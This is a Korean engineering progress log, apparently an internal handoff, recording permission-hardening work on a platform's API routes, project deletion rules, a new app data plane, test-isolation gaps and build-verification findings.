  세 번 다 원인이 같다 — **검사기를 먼저 검증하지 않고 그 결과를 사실로 썼다.**
  다음 사람은 라우트를 세기 전에 **판정이 있는 라우트 몇 개를 골라 스캐너가 그것을 «있음»
  으로 세는지** 먼저 확인할 것.

### ⬜ 남은 1건 + 사용자 판단 1건

**① `DELETE /api/v1/sandbox/token/{token}` — 봉합 아님, 면제 대상**
bearer 토큰이다. 문자열을 아는 사람은 **이미 그 토큰을 쓸 수 있으므로**, 회수만 막는 것은
보호가 아니라 사고 대응 지연이다. 유출된 토큰을 발견한 사람이 즉시 끊을 수 있어야 한다.
→ **식별만 요구하도록 고쳤다**(2026-08-08). 종전에는 익명도 회수할 수 있어 감사에
  `actor=unknown` 으로 남았다 — 「누가 이 토큰을 끊었나」에 답할 수 없는 회수는 조사에 쓸모없다.
⚠️ `EXEMPT` 등재는 하지 못했다 — `test_route_authority_table` 이 표가 다루는 7개 라우터만
  실제 라우트로 인정해서 «없는 라우트를 면제했다» 로 걸린다. `sandbox_control` 을
  `GUARDED_MODULES` 에 넣는 것이 맞는 순서이며, 그러려면 아래 ②를 먼저 정해야 한다.

**② `POST /api/v1/sandbox/token` — 봉합 완료 (2026-08-08)**

`issue()` 가 요청한 `scope_node_id` 를 **검증하지 않는다.** 비어 있는지만 본다
(「범위 없는 토큰은 '전부 허용'이 되고 그것은 권한 승급입니다」는 막았지만 **남의 범위**는
막지 않았다). 즉 식별된 사용자는 **어떤 가상 조직 범위로든** 읽기 토큰을 발급할 수 있다.

★ 판정 기준을 지어내지 않고 **설계에서 찾았다.** §7.1 은 가상 조직이 **실제 조직의 복제본**
  이고 `EnterpriseEntity.base_entity_id` 가 원본을 가리킨다고 규정한다 →
  **복제 원본을 볼 수 있는 사람이 그 복제본도 볼 수 있다.**
  ⚠️ 순진하게 「가상 노드가 내 `readable_scope_nodes` 안인가」로 막으면 **E3 가 통째로 죽는다**
    (복제본은 조직 디렉터리에 등록되지 않는다). 양방향 변이 검사로 둘 다 확인했다 —
    판정 제거 3건 실패 · **E3 를 죽이는 순진한 구현도 3건 실패.**

---

### (아래는 2026-08-07 착수 시점 기록)

### ✅ 프로젝트 삭제 (사용자 결정 2026-08-07)

> 「이미 등록된 프로젝트는 **등록자가 지울 수 있고**(삭제 플래그만, 실제 삭제는 하지 않음,
>  데이터는 남겨둠), **공유·전달 단계까지 된 건 admin 만** 삭제 처리 가능,
>  **실제 지울 수 있는 권한도 admin 만**.」

판정은 `core/project_deletion.py` **한 곳**에 있다(`classify()`). 라우트·화면·스크립트가
같은 답을 얻는다 — 「버튼은 보이는데 서버는 거부한다」를 만들지 않기 위해서다.

| 무엇을 | 누가 | 결과 |
|---|---|---|
| 표시 삭제 — 공유 이력 없음 | 등록자 · admin | `project_meta.json` 에 표시. **파일은 그대로** |
| 표시 삭제 — 공유·전달됨 | **admin 만** | 같음 |
| 실제 삭제 `?purge=true` | **admin 만** | 디렉터리·체크포인트 제거 |
| 되돌리기 `POST /{id}/restore` | 표시 삭제할 수 있는 사람 | 데이터를 남겨 둔 이유 |

**살아 있는 서버 실측 (8081, 2026-08-07)** — 네 규칙 전부 확인:

```
viewer      DELETE /projects/del_probe_1            → 403
viewer      DELETE ...?purge=true                   → 403
등록자      DELETE /projects/del_probe_2            → 200  (파일 남음 · 목록에서 빠짐)
등록자      DELETE ...?purge=true                   → 403  「실제 삭제는 관리자만」
등록자      POST   /projects/del_probe_2/restore    → 200  (목록에 되돌아옴)
공유 등록 후 등록자 DELETE                          → 403  「공유 또는 전달됐습니다」
admin       DELETE (공유된 것)                      → 200
```

**★ 「모르면 막는다」를 두 곳에 넣었다.**
1. 소유권 기록이 없으면 **admin 만**. 종전 `assert_project_writable` 의 「소유권 미기록
   프로젝트에 대한 관대함」은 읽기용인데 삭제까지 따라와서 **viewer 가 200 을 받았다.**
2. 공유 여부를 **확인하지 못하면** «공유 안 됨» 이 아니다. 저장소가 잠깐 죽은 사이에
   공유된 프로젝트가 지워지면 안 된다.

**함께 고친 거짓말 2건**
· 확인 문구가 「물리 디스크의 모든 산출물을 지우며 복구할 수 없습니다」였다 — 이제 표시
  삭제인데 그대로 두면 화면이 서버보다 무섭게 거짓말한다.
· 실패를 `false` 로만 돌려줘 화면이 「에러가 발생했습니다」밖에 못 했다. 권한 문제·공유된
  프로젝트·서버 장애는 사용자가 할 일이 다르다 → 서버 문구를 그대로 보여 준다.

검증: `tests/test_project_deletion_policy.py` 13건(정책 10 + 라우트 3).

---

### 남은 31건 — 왜 아직 세기만 하는가

### 왜 이것이 별도 트랙인가

트랙 G 는 「무방비 라우트」를 셌고, 그 정의는 **`Principal` 을 받지 않는 라우트**였다.
그런데 G 게이트의 2차 검사가 다른 것을 찾아냈다 — **`Principal` 을 받지만 권한은 보지 않는**
라우트다. 이것들은 G 의 분모에 한 번도 들어간 적이 없다. 라우트 점검에서는 「주체를 받으니
통제됨」으로 세어졌기 때문이다.

⚠️⚠️ **«주체를 받는가» 와 «권한을 보는가» 는 다른 질문이다.** 전자만 세면 절반이 초록으로
보이고, **그 절반은 익명 검사만으로는 영원히 드러나지 않는다.** 익명은 막히는데 로그인한
viewer 는 통과하므로, 익명 탐침은 전부 초록을 준다.

### 실측 (viewer `hikwon_17@lsmnm.com` 으로 호출, 2026-08-07)

**33개 쓰기 라우트가 읽기 전용 계정에 열려 있다.** 200/404/409 는 전부 «인가를 지났다» 는
뜻이다(404 는 자원이 없어서일 뿐 통제가 아니다).

| 파일 | 열린 쓰기 | 눈에 띄는 것 |
|---|---:|---|
| `factory_control` | 22 | `DELETE /projects/{id}` **200** · `POST /projects` 200 · `PUT /projects/{id}/knowledge` 200 · `sprint/pause`·`stop` 200 |
| `advisor_control` | 6 | 상담 생성·청사진 승인·프로젝트 부트스트랩 |
| `enterprise_context_control` | 2 | `rollup` · `executive-board` |
| `reference_control` | 1 | `scan` |
| `jarvis_control` | 1 | `ask` |
| `program_control` 외 | 1 | — |

★ 가장 무거운 것은 **`DELETE /api/v1/factory/projects/{id}` 가 viewer 에게 200** 이라는 것이다.
읽기 전용 계정이 프로젝트를 지울 수 있다.

### 왜 지금 고치지 않았는가

이것은 라우트 봉합(G)이 아니라 **런타임 권한 강제**이고, 설계상 **트랙 B P3** 의 몫이다.
33개에 권한 코드를 배정하려면 「누가 프로젝트를 지울 수 있는가」 같은 결정이 필요하고,
그것을 라우트마다 즉석에서 정하면 역할 표가 파일마다 자란다(D-017 이 막으려던 상태다).

⬜ **그래서 세기만 하고 0/33 으로 둔다.** ⚠️ 진척률이 61% → 52% 로 «떨어진» 것이 아니라,
세지 않고 있던 일을 세기 시작한 것이다 — 2026-08-05 에 분모가 49 → 78 로 늘었을 때와 같다.

---

## I. 생성 앱 데이터 평면 — **2.5/7** (2026-08-08 신설)

> 설계: `docs/design_app_data_plane_2026-08-08.md` · 결정: Supervisor «(B) 먼저, (A)는 사례 쌓고 재판정»

### 왜 (B) 인가 — 새 방향이 아니라 **이미 한 약속의 이행**이다

★★★ `core/app_manifest.py`(CL-0)가 생성 앱의 계약을 **이미 고정값으로** 못 박아 두었다:
`auth_mode=PLATFORM_INHERITED` · `enterprise_scope_mode=HOST_CONTEXT` ·
`audit_mode=PLATFORM_LEDGER` · `forbidden_features=local_login·local_user_store·jwt_issuer`.
그리고 `standalone_auth=True` 를 **경고가 아니라 거부**한다.

| 선택지 | CL-0 계약과의 관계 |
|---|---|
| (A) 앱 런타임(G1) — 생성 백엔드를 기동 | 앱이 **자기 백엔드를 갖는** 길 — 매니페스트가 금지한 방향과 같은 쪽 |
| **(B) 플랫폼 데이터 평면** | **계약이 처음부터 전제한 구조** |

★ 즉 없던 것은 «방향» 이 아니라 그 계약을 이행할 **데이터 평면 하나**였다. 매니페스트는
**지킬 수단이 없는 약속**으로 남아 있었다.
⚠️ (A)를 닫지 않는다 — 설계서 §9-2 가 G1 을 «사실상 미니 PaaS» 로 재평가했고
`AI_HANDOFF.md:251` 의 «인프라 과투자» 기각과 충돌한다. **사례가 쌓인 뒤 재판정**한다.

| # | 항목 | 상태 |
|---|---|---|
| I-1 | 저장소 코어 `core/app_data_store.py` · `core/app_data.py` | ✅ |
| I-2 | 데이터 API `api/routes/app_data_control.py` (10 라우트) | ✅ |
| I-3 | **iframe 브리지** — 앱은 자격증명을 보지 않는다 | ⬜ **다음** |
| I-4 | 생성기 연동 — 백엔드 생성 대신 이 API 를 쓰게 | ⬜ |
| I-5 | 카탈로그 등재 — 게시 시 스키마 등록 | ⬜ |
| I-6 | 검증 UI — 사람이 눈으로 데이터 확인 | ⬜ |
| I-7 | 회귀 테스트 | ◐ **0.5** — 도메인·API 39건 잠금, 브리지분 미착수 |

### 구현이 확정한 판단

- **권한을 새로 만들지 않았다.** `current_principal` · `assert_release_readable` · 감사 원장을
  그대로 태운다. 다만 `assert_release_writable` 은 **없어서 신설**했다(`api/deps.py`) — 릴리스는
  종전까지 불변 스냅샷이라 읽기만 있었는데, 앱이 그 밑에 데이터를 쌓으면서 «바꿀 수 있는가» 가
  새로 생겼다. 라우트에 흩지 않고 판정 함수 안에 뒀다(트랙 G/H 와 같은 이유).
- **감사를 두 층으로 나눴다.** 데이터셋 **구조 변경**은 원장에, **레코드 단위**는 레코드 자신의
  `created_by`/`updated_by`/`deleted_by` 에. ⚠️ 레코드마다 원장을 쓰면 2,457건짜리 결정 이력이
  업무 로그에 파묻힌다. 이 구분을 테스트가 양방향으로 고정한다.
- **선언에 없는 필드는 거부한다.** 「그냥 넣는다」로 두면 I-5 카탈로그 등재가 거짓이 된다.
- **삭제는 논리 삭제.** 물리 삭제하면 원장이 가리키는 대상이 사라져 감사 증적이 아니게 된다.

### 이번 구현에서 잡힌 결함 2건 (전부 자체 검증에서)

1. **pydantic v2 에서 `class Config: fields` 는 조용히 무시된다** — v1 문법이라 오류도 나지
   않고 별칭만 죽는다. 그러면 생성기가 보낸 `schema` 키가 버려지고 «필드 선언이 없다» 로
   거부되는데, 오류 메시지가 원인을 가리키지 않는다. 회귀 테스트로 잠갔다.
2. ★ **두 한계가 서로 어긋나 있었다** — `MAX_TEXT_LEN`(100,000자 = 한글 300KB) >
   `MAX_PAYLOAD_BYTES`(256KB). 즉 **스키마가 허용하는 값을 저장할 수 없는 구간**이 있었고,
   사용자에게는 「길이 제한 안인데 크기 초과로 거부됨」으로 보인다. 총량을 512KB 로 올리고
   두 값의 관계를 `assert` 로 못박았다.

### 검증

`pytest tests/` **2,654 passed · 실패 0**(신규 39건 포함, 2026-08-08).
★ 운영 `data/app_data.db` 가 **생기지 않았음을 확인**했다 — `tests/conftest.py` 에 격리를
추가했다. 라우트가 싱글턴을 쓰므로 격리가 없으면 실 DB 에 쓴다(`master.db` 가 실제로 그렇게
오염됐던 것과 **같은 구조**다). ⚠️ 여기 담기는 것은 업무 데이터다.

⬜ **실서버 쓰기 실측은 하지 않았다.** 「운영 DB 에 쓰기 탐침 금지」 규칙에 따른다 —
I-6 검증 UI 가 서면 격리 환경에서 사람 손으로 확인한다.

---

## ⚠️ 세지 않는 것 — 이것이 «37%» 의 한계다
| 테스트 격리 없는 저장소 **7개** | advisor · collaboration · connectors · decision_ledger · external_intelligence · benchmark · chroma · mcp_cache | 어느 테스트가 쓰는지 확인 필요 |
| 테스트가 **git 미추적 런타임 파일**에 의존 | `agents_registry.json` (저장소 루트) | 아래 상세 |
| 가오픈 준비 | 파일럿 대상자 명단 · 문서 DRM | 사용자가 «UIUX 배치 작업 후» 로 지정 |
| **다른 세션의 «완료» 주장** | — | 코드에서 확인될 때 반영 |
| **시각 승인 대기** | — | 기능이 끝나도 감사 캡처 전에는 «완료» 가 아니다(UIUX 게이트) |
| **결정 대기** | 상위 조직 경영계획 상속 · 매핑 안 된 부서 처리 · 계획 수립 권한 | 제품 정책이므로 사용자 결정 필요 |
| **결정 대기(신규 · 병합 실측)** | ① **에이전트 제어판 저장을 지금 아무도 할 수 없다** ② 역할 없는 활성 사용자는 구성 화면이 빈다 | 아래 상세 |

#### 테스트가 저장소에 없는 파일에 의존한다 (2026-08-05 병합 검증에서 발견)

`test_agent_governance_api.py` 2건이 새 워크트리에서 실패했다. 원인은 병합이 아니라
**`agents_registry.json` 이 없어서**였다 — 파일 자산의 출처 판정이
`os.path.exists(REGISTRY_PATH)` 하나이고(있으면 `LEGACY`, 없으면 `SYSTEM`), 그 파일은
**git 에 추적되지 않는 런타임 산출물**이라 새 체크아웃에는 존재하지 않는다.
⚠️ 즉 이 두 테스트는 원본 작업 디렉터리에서만 통과한다 — CI 나 새로 클론한 개발자에게는
실패한다. 판정 자체는 옳다(파일 존재가 곧 «파일에서 왔다» 다). 고칠 곳은 테스트이며,
`monkeypatch.setattr(ar, "REGISTRY_PATH", ...)` 로 두 상태를 각각 만들어야 한다
(`test_reset_keeps_previous_state` 는 이미 그 방식으로 격리돼 있다 — 본받을 사례가 같은
파일 안에 있다).
→ 트랙 B 잔여 작업으로 넣는다. 이번 병합 검증에서는 파일을 워크트리에 복사해 병합 무결성만
확정했다(테스트 격리 결함은 그대로 남아 있다).

#### 병합 검증에서 드러난 결정 사안 2건 (2026-08-05)

**① `PUT /api/v1/factory/agents` 를 실행할 수 있는 사람이 0명이다.**
이 라우트는 `require_caps(AGENT_UPDATE, SYSTEM_DEFAULT_EDIT)` 를 요구한다. 실측:
`SYSTEM_DEFAULT_EDIT` 를 주는 역할·플래그가 하나도 없고(`viewer`·`member`·`manager`·AI
관리자·데이터 관리자·경영진 전부 없음 — 설계상 플랫폼 관리자 전용), 운영 DB 의 플랫폼 관리자는
**0명**이다. 즉 에이전트 제어판의 저장 버튼은 눌러도 403 이다.
⚠️ 통제를 임의로 넓히지 않았다 — `SYSTEM_DEFAULT_EDIT` 는 «전 사용자의 출발점을 바꾸는 일»
로 설계돼 AI 거버넌스 관리자에게서도 일부러 뺀 능력이다. 테스트를 통과시키려고 그것을 데이터
관리자에게 주면 설계 판정을 테스트 편의로 뒤집는 것이 된다.
→ **선택지**: ⓐ 플랫폼 관리자를 임명한다 ⓑ 레지스트리 편집 자격을 `SYSTEM_DEFAULT_EDIT`
보다 낮춘다(예: AI 거버넌스 관리자). 현재 상태는
`tests/test_agent_config_gate.py::test_agent_registry_write_currently_has_no_holder` 가
사실로 고정해 두었다.

**② 역할이 하나도 없는 활성 사용자는 에이전트·템플릿 구성을 못 본다.**
읽기 통제가 `require_caps(AGENT_READ)` 이고 `AGENT_READ` 는 부서 역할(`viewer` 이상)에서만
온다. 지금은 운영 DB 22명 **전원이 역할을 갖고 있어** 문제가 드러나지 않는다. 입사 직후처럼
역할 부여 전 상태가 생기면 그 사람은 제품을 열자마자 빈 화면을 본다.
→ **선택지**: ⓐ 활성 사용자에게 `viewer` 를 기본 부여한다 ⓑ 역할 미부여 상태를 화면이
«권한 대기» 로 안내한다(빈 화면과 구분).

### 검증 기준선

`pytest tests/` **2,089 passed · 1 skipped · 실패 0**(2026-08-05, 병합본 `merge/screens-into-dev`
기준. 종전 기준선 2,037 → 브랜치가 가져온 테스트 파일 2개 + 회귀 교정분 + 경영계획 봉합분).

**프론트엔드**: `cd frontend && npx tsc -b` 오류 **0** · `npm run build` 성공(2026-08-05).

★★★ **이 기준선은 오늘 처음 세웠고, 세우자마자 오류 15건이 나왔다.** 14건이 방금 병합한 이관
화면들의 것이었다 — 즉 **프론트엔드 프로덕션 빌드가 깨진 상태로 커밋돼 있었다.** 가장 심각한
것은 `useConfirm` 이 `open` 을 돌려주지 않는데 8곳이 그것을 읽고 있던 것이다.
`ConfirmInline` 은 `if (!open) return null` 이라 **확인창이 한 번도 열리지 않았다** —
에이전트 구성 초기화·부서 폐지·부서 시드·스킬 제안 승인·업무표준 폐지 버튼이 전부 죽어 있었다.
브라우저로 실측했다: 클릭해도 확인창이 없고 네트워크 요청도 없다(실행되지도 않는다).

⚠️ **왜 아무도 못 봤나.** `vite dev` 는 타입을 보지 않는다. 개발 중에는 화면이 정상으로 보이고
`npm run build`(`tsc -b && vite build`)만 실패한다. 그리고 버튼을 눌러 «아무 일도 없음» 은
화면에서 «권한이 없어 막힘» 과 구분되지 않는다. → **화면이 뜬다는 것과 기능이 동작한다는 것은
다르다.** 파이썬 테스트 2,089건은 이것과 무관하다.
⚠️ `npx tsc --noEmit -p tsconfig.json` 은 **0개 파일을 검사하고 조용히 통과한다**(솔루션 파일).
반드시 `tsc -b` 또는 `-p tsconfig.app.json` 을 쓴다.

⚠️ 이 숫자를 재려면 `--tb=no -q` 출력을 **파이프로 자르지 말 것.** 처음 측정에서 `| tail -25` 로
잘라 진행 문자를 1,794 개만 세고는 «243건이 사라졌다» 고 오판했다. 실패 목록은 출력 끝에 있어
`tail` 로도 보이지만, 총계는 앞부분까지 있어야 나온다.
